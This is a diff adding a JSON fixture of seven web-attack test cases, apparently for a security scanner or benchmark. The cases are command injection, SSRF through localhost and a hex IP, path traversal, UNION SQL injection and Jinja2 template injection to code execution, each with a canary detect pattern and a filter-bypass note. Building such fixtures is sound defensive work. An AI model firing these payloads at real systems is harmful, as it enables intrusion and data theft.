@@ -1,0 +1,72 @@
+[
+  {
+    "id": "dyn_cmd_1",
+    "endpoint": "/ping",
+    "method": "POST",
+    "params": {
+      "host": "127.0.0.1;id"
+    },
+    "detect_pattern": "uid=[0-9]+\\(",
+    "technique": "semicolon command separator (not in block_patterns)"
+  },
+  {
+    "id": "dyn_cmd_2",
+    "endpoint": "/ping",
+    "method": "POST",
+    "params": {
+      "host": "127.0.0.1\tid"
+    },
+    "detect_pattern": "uid=[0-9]+\\(",
+    "technique": "tab character IFS bypass"
+  },
+  {
+    "id": "dyn_ssrf_1",
+    "endpoint": "/fetch",
+    "method": "GET",
+    "params": {
+      "url": "http://127.0.0.1:8080/healthz"
+    },
+    "detect_pattern": "CANARY_SSRF_3e7d2c",
+    "technique": "direct localhost IP (not in host allowlist)"
+  },
+  {
+    "id": "dyn_ssrf_2",
+    "endpoint": "/fetch",
+    "method": "GET",
+    "params": {
+      "url": "http://0x7f000001:8080/healthz"
+    },
+    "detect_pattern": "CANARY_SSRF_3e7d2c",
+    "technique": "hex-encoded IP octet bypass"
+  },
+  {
+    "id": "dyn_path_1",
+    "endpoint": "/read",
+    "method": "GET",
+    "params": {
+      "name": "....//....//tmp/path_canary.txt"
+    },
+    "detect_pattern": "CANARY_PATH_5c9e0a",
+    "technique": "double-dot with slash variation to bypass .. check"
+  },
+  {
+    "id": "dyn_sqli_1",
+    "endpoint": "/search",
+    "method": "GET",
+    "params": {
+      "q": "' UNION SELECT flag FROM secrets--"
+    },
+    "detect_pattern": "CANARY_SQLI_7f3a9c",
+    "technique": "UNION-based SQLi (no parameterization active)"
+  },
+  {
+    "id": "dyn_ssti_1",
+    "endpoint": "/render",
+    "method": "POST",
+    "params": {
+      "template": "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
+    },
+    "detect_pattern": "uid=[0-9]+\\(",
+    "technique": "Jinja2 config object traversal to RCE (no sandbox)"
+  }
+]
